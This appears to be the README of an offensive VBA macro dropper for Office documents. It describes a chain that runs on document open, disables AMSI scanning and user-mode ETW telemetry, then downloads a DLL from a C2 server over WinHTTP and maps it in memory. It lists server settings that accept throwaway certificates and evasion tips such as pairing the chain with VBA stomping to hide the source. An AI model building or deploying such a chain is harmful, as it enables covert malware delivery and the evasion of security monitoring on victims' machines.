# Dropper (VBA)

The whole chain in one module. Paste into a standard module, set the config
constants at the top, and wire `Document_Open` (see `ThisDocument.txt`). 64-bit
Office.

Two variants, per repo convention:

- `Dropper_Standalone.bas`: self-contained, paste and go
- `Dropper.bas`: same logic, reuses `WinAPI_Core.bas` for shared declares
- Internal module names are neutral (`RunCtx` / `RunCtx_Standalone`), same
  convention as `ScanCtx` and `EvtCtx`.

## The chain

```
Document_Open
  -> stage 1: ScanCtx   runtime content-scan neutralization   (AmsiNeutralize)
  -> stage 2: EvtCtx    user-mode ETW silencing               (EtwSilence)
  -> stage 3: RefLoader WinHTTP fetch + manual map + DllMain  (ReflectiveLoader_WinHTTP)
```

Each neutralization stage is the same verified code as its standalone module,
inlined:

- Stage 1 relocates the engine's stored scan pointer to an existing
  `xor eax,eax; ret` gadget in ntdll, found by value scan (no hardcoded
  offsets).
- Stage 2 clears the cached enable bytes (`+0x74`, `+0xEC`) on every ETW
  provider registration ntdll keeps in the process, located by scanning
  `EtwEventWrite`'s code and validated against a probe registration the module
  makes and removes itself.
- Stage 3 downloads the PE over WinHTTP (no disk write), maps it at its
  preferred base with relocation and import resolution, and calls `DllMain`
  through `CallWindowProcW` without creating a thread.

Both neutralizers arm before the transport runs, so the WinHTTP activity and
everything after it happens with scans redirected and user-mode telemetry
silent. Stage failures degrade rather than abort: the neutralizers are
hardening, so the chain continues if either fails and the report records what
happened. Stage 3 failures abort.

## Differences from the component modules

- No UI. `Run` logs to `Debug.Print` only and returns True/False. `GetReport`
  returns `scan=...;etw=...;dll=...` after the run.
- No disarm on document close, by design. The payload outlives the document
  event that launched it, and process teardown reclaims the redirect and the
  mapped image. `DisarmAll` exists for manual use.
- One fix over the original loader: `IMAGE_REL_BASED_HIGHLOW` relocations now
  add in `LongPtr` and store the low dword. The original
  `CLng(delta And &HFFFFFFFF)` overflows in VBA when the relocation delta has
  bit 31 set (negative delta, which is the common case when the preferred
  base is unavailable).
- `#Const DEV_LOG = 1` makes `Run` append its report to `DEV_LOG_PATH`. Used
  by the self-test; leave it 0 in any real build.

## Config

```vba
Private Const SERVER_HOST As String = "127.0.0.1"
Private Const SERVER_PORT As Long = 8080
Private Const PAYLOAD_PATH As String = "/payload.bin"
Private Const USE_HTTPS As Boolean = False
Private Const USER_AGENT As String = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

`USE_HTTPS = True` accepts self-signed certs (SECURITY_FLAG_IGNORE_ALL), so the
C2 can run with a throwaway certificate.

## Limitations

Inherited from the components; see their READMEs for the full detail. The
short list: 64-bit Office only; the ETW gate offsets are ntdll-build facts
(rerun the functional test per build); registrations created after arming are
not silenced (re-run if the payload hosts the CLR); kernel-side telemetry
(ETW-TI, callbacks, the minifilter) is untouched and belongs to the payload.

The loader maps with a single `VirtualAlloc(..., PAGE_EXECUTE_READWRITE)`,
which emits an ETW-TI alloc-exec event on every modern build. That is the
loudest kernel-visible artifact in the chain. Splitting it into RW plus one RX
transition does not hide the event; it just stops advertising RWX. Left as is
to stay byte-identical to the verified loader.

The payload runs on the macro thread under Word's token. If it needs a
specific host environment, handle that inside the payload.

## Usage

```vba
RunCtx_Standalone.Run        ' full chain; True when the DLL mapped and ran
RunCtx_Standalone.GetReport  ' scan=redirected;etw=silenced;dll=<hex base>
RunCtx_Standalone.DisarmAll  ' restore both neutralizers (payload stays mapped)
```

Pair with `vba-stomp` on the carrier document: the stomp kills the on-disk
source, the chain kills the runtime surfaces.

## Verification

`python test/dropper_selftest.py` runs the complete chain against a local
HTTP server in real Word:

1. Serves `test_dll_quiet.dll` (compiled from `test_dll_quiet.c`; on
   `DLL_PROCESS_ATTACH` it writes a marker file, no UI) as `/payload.bin`.
2. Builds a doc with the dropper module, config patched to the local server
   and `DEV_LOG = 1`.
3. Runs `RunCtx_Standalone.Run` via automation.
4. Asserts the report shows both stages armed and a nonzero DLL base, and
   that the marker file exists: every stage, including the payload's
   `DllMain`, executed in the real chain order.
